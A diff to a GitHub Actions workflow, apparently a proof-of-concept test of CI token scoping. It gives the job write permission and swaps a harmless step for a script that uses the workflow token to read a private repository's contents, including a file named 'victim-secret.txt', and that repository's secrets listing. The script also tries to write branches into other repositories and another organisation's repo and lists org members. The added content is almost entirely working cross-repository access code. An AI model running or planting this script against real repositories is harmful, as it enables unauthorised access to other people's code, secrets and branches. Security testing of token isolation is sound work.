@@ -2,8 +2,40 @@ name: slowgate
 on:
   pull_request:
   merge_group:
+permissions:
+  contents: write
 jobs:
   slowgate:
     runs-on: ubuntu-latest
     steps:
-      - run: echo ok
+      - name: does this token reach OUTSIDE its repository?
+        env:
+          GH_TOKEN: ${{ github.token }}
+          R: ${{ github.repository }}
+          S: ${{ github.sha }}
+          V: mrbenty-b-org/zz-victim-1027
+          XORG: kovac-labs/zz-ceil-vfy-1027
+          E: ${{ github.event_name }}
+        run: |
+          A="Authorization: Bearer $GH_TOKEN"; AC="Accept: application/vnd.github+json"
+          c(){ curl -s -o /tmp/o -w '%{http_code}' -H "$A" -H "$AC" "$@"; }
+          cn(){ curl -s -o /dev/null -w '%{http_code}' -H "$AC" "$@"; }
+          echo "XR event=$E"
+          echo "XR scoping /installation/repositories = $(c https://api.github.com/installation/repositories)"
+          python3 -c "import json;d=json.load(open('/tmp/o'));print('   XR installation total_count =',d.get('total_count'),'repos =',[r['full_name'] for r in d.get('repositories',[])])" 2>/dev/null || head -c 140 /tmp/o
+          echo
+          echo "XR self-read  OWN repo           = $(c https://api.github.com/repos/$R)"
+          echo "XR self-write OWN repo           = $(c -X POST https://api.github.com/repos/$R/git/refs -d "{\"ref\":\"refs/heads/xrs-$GITHUB_RUN_ID-$E\",\"sha\":\"$S\"}")"
+          echo "XR other-repo METADATA (private) = $(c https://api.github.com/repos/$V)"
+          echo "XR other-repo CONTENT  (private) = $(c https://api.github.com/repos/$V/contents/victim-secret.txt)"
+          python3 -c "import json,base64,hashlib;d=json.load(open('/tmp/o'));v=base64.b64decode(d['content']).decode().strip();print('   XR CROSS-REPO CONTENT READ len=%d sha256=%s'%(len(v),hashlib.sha256(v.encode()).hexdigest()[:16]))" 2>/dev/null || true
+          echo "XR other-repo SECRETS  (private) = $(c https://api.github.com/repos/$V/actions/secrets)"
+          echo "XR other-repo WRITE    (private) = $(c -X POST https://api.github.com/repos/$V/git/refs -d "{\"ref\":\"refs/heads/xr-$GITHUB_RUN_ID-$E\",\"sha\":\"$S\"}")"
+          echo "XR ORG read                      = $(c https://api.github.com/orgs/mrbenty-b-org)"
+          echo "XR ORG members                   = $(c https://api.github.com/orgs/mrbenty-b-org/members)"
+          echo "XR OTHER-ORG repo read           = $(c https://api.github.com/repos/$XORG)"
+          echo "XR OTHER-ORG repo write          = $(c -X POST https://api.github.com/repos/$XORG/git/refs -d "{\"ref\":\"refs/heads/xr-$GITHUB_RUN_ID\",\"sha\":\"$S\"}")"
+          echo "XR anon-control other-repo       = $(cn https://api.github.com/repos/$V)"
+      - name: hold the queue open briefly
+        if: github.event_name == 'merge_group'
+        run: sleep 30
